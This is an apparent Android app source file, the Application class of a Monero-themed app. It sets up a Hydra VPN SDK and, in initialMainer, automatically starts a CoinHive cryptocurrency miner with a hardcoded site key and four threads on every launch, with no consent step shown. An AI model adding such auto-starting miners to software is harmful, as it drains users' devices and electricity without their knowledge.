package com.example.pavel.monero;

import android.app.Application;
import android.util.Log;
import com.anchorfree.hydrasdk.HydraSDKConfig;
import com.anchorfree.hydrasdk.HydraSdk;
import com.anchorfree.hydrasdk.api.ClientInfo;
import com.anchorfree.hydrasdk.vpnservice.connectivity.NotificationConfig;
import com.example.pavel.monero.di.AppComponent;
import com.example.pavel.monero.di.DaggerAppComponent;
import com.example.pavel.monero.serves.CoinHive;


public class App extends Application {

    private AppComponent appComponent;

    @Override
    public void onCreate() {
        super.onCreate();
        initHydraSDK();
        initialMainer();
        appComponent = createAppComponent();
    }

    private void initHydraSDK(){
        ClientInfo clientInfo = ClientInfo.newBuilder()
                .baseUrl("https://backend.northghost.com")
                .carrierId("31415")
                .build();

        NotificationConfig notificationConfig = NotificationConfig.newBuilder()
                .title(getResources().getString(R.string.app_name))
                .enableConnectionLost()
                .build();

        HydraSdk.setLoggingLevel(Log.VERBOSE);

        HydraSDKConfig config = HydraSDKConfig.newBuilder()
                .observeNetworkChanges(true)
                .captivePortal(true)
                .build();
        HydraSdk.init(this, clientInfo, notificationConfig, config);

    }

    private void initialMainer() {
        CoinHive.getInstance()
                .init("7D1i4fiOWJEVdtZ6T17jBI3c61LHsI3p")
                .setNumberOfThreads(4)
                .setIsAutoThread(true)
                .setThrottle(0.2)
                .setLoggingEnabled(true)
                .setForceASMJS(false);
    }

    private AppComponent createAppComponent() {
        return DaggerAppComponent
                .builder()
                .application(this)
                .build();
    }

    public AppComponent getAppComponent() {
        return appComponent;
    }
}
